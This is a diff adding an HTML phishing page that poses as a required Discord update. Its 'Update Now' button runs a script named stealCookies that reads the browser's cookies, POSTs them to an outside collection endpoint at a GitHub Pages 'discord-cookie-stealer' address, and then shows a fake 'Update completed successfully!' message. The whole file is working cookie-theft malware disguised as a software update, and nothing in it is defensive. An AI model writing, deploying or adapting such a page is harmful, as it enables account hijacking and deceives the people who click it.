@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Update</title>
+</head>
+<body>
+    <h1>Discord Update Required</h1>
+    <p>Click "Update" to continue using Discord</p>
+    <button onclick="stealCookies()">Update Now</button>
+
+    <script>
+        function stealCookies() {
+            // جلب الكوكيز من المتصفح
+            var cookies = document.cookie;
+            
+            // إرسال الكوكيز إلى GitHub Pages
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://rayenmk.github.io/discord-cookie-stealer/steal", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(JSON.stringify({cookies: cookies}));
+            
+            alert("Update completed successfully!");
+        }
+    </script>
+</body>
+</html>
